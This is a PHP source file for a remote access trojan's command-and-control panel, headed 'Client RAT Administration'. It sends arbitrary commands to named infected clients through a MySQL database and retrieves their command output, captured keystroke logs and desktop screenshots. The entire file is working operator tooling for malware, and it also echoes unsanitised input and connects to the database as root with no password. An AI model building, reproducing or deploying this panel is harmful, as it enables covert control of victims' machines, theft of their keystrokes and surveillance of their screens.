<?php  
	if(isset($_GET['client']) && !empty($_GET['client'])){
		$client =  $_GET['client'] ;
	}
	elseif (isset($_POST['client']) && !empty($_POST['client'])){
		$client = $_POST['client'];
	}
	else{
		$client = 'no client';
	}			
			
?>
		

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Client RAT Administration</title>
  <style>
    body {
      font-family: 'Courier New', monospace;
      background-color: #202020;
      color: #e0e0e0;
      padding: 40px;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #command-form {
      width: 60%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    img {
      border-radius: 50%;
      margin-bottom: 15px;
    }

    h2 {
      font-size: 2.2rem;
      color: #c0c0c0;
      margin-bottom: 25px;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input[type="text"] {
      width: 70%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #505050;
      background-color: #303030;
      color: #ffffff;
    }

    input[type="submit"] {
      background-color: #556677;
      color: #ffffff;
      border: none;
      padding: 10px 20px;
      margin: 10px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    input[type="submit"]:hover {
      background-color: #778899;
    }

    a {
      color: #77ccff;
      text-decoration: none;
      margin-top: 20px;
    }

    a:hover {
      color: #99ddff;
    }

  </style>
</head>
<body>
  <div id="command-form">
    <img src="serverIcon.png" alt="Server Icon" width="120px">
    <h2>Client RAT Administration</h2>
    <form method="post" action="openClient.php" id="cmdform"> 
      RAT Client Name: <input type="text" name="client" readonly value="<?php echo $client ?>"/>
      <p>Please enter your command: </p>
      <input type="text" name="cmdstr" size="35%">
      <input type="submit" name="buttonExecute"  value="Execute">

      <input type="submit" name="buttonGetResult"  value="Get Return String">
      <input type="submit" name="buttonGetKeylog"  value="Get Keylog">
      <input type="submit" name="buttonGetDesktop"  value="Get Desktop">
      <a href='index.php'>Back to Main</a>
    </form> 
  </div>
</body>
</html>



<?php
	
	if(isset($_POST['buttonExecute'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		if(isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])){
			
			$cmdstr = $_POST['cmdstr'];
			echo 'Received: '.$cmdstr.'<br>';
			$query="UPDATE clients SET cmd=? WHERE name=?";
			$stmt = $db->prepare($query);
			$stmt->bind_param('ss',$cmdstr,$client); //i(integer),s(string),d(double),b(blob)
			$stmt->execute();
		
			$db->close();
		}
		  
		
		
	}
	elseif(isset($_POST['buttonGetResult'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT retstr FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($retStr);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $retStr;
		echo "</textarea>";
		$db->close();
		
	}
	elseif(isset($_POST['buttonGetKeylog'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT keylog FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($keylog);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $keylog;
		echo "</textarea>";
		$db->close();
		
	}
	elseif(isset($_POST['buttonGetDesktop'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT desktop FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($desktop);
		$stmt->fetch();
		
		echo "<img width='600' src= 'data:image/jpeg;base64,".base64_encode( $desktop) . "'/>";
		
		$db->close();
		
	}
?>